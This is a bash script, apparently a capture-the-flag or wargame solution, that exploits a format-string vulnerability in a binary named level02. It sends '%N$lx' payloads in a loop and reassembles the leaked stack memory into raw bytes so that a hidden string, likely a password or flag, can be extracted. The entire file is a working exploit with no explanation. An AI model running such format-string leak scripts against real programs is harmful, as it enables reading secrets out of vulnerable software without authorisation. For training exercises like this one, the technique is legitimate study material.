#!/bin/bash

elf="/home/users/level02/level02"
out="/tmp/out"

echo "Outfile: $out"

echo > "$out"
for i in {1..200}; do
    payload=$(printf "START%%$i\$lxEND\n1234\n")
    #echo "$i:" $("$elf" <<< "${payload}" | grep -oP '(?<=START).*(?=END)')

    # address=$("$elf" <<< "${payload}" | grep -oP '(?<=START).*(?=END)')
    # address=$(printf "%8s\n" "${address}" | tr ' ' '0')
    # address=$(printf \\x${address:6:2}\\x${address:4:2}\\x${address:2:2}\\x${address:0:2})
    # echo -n "$address" >> "$out"

    # address=$("$elf" <<< "${payload}" | grep -oP '(?<=START).*(?=END)')
    # if [ ${#address} -eq 8 ]; then
    #     #echo "$address" >> "$out"
    #     address=$(printf \\x${address:6:2}\\x${address:4:2}\\x${address:2:2}\\x${address:0:2})
    #     echo -n "$address" >> "$out"
    # fi

    address=$("$elf" <<< "${payload}" | grep -oP '(?<=START).*(?=END)')
    address=$(printf "%16s\n" "${address}" | tr ' ' '0')
    address=$(printf \\x${address:14:2}\\x${address:12:2}\\x${address:10:2}\\x${address:8:2}\\x${address:6:2}\\x${address:4:2}\\x${address:2:2}\\x${address:0:2})
    echo -n "$address">> "$out"
done

cat "$out" | grep -oP '(?<=1234).*(?=START)'
